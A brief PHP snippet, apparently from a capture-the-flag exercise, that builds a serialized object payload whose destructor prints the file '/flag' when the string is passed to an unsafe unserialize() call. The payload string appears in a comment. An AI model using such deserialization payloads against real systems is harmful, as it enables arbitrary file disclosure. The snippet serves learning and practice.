```php
<?php
class Demo { 
    public $file = 'index.php';
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
}
$a = new Demo();
$a->file = "/flag";
echo serialize($a);  //O:4:"Demo":1:{s:4:"file";s:5:"/flag";}
?>
```
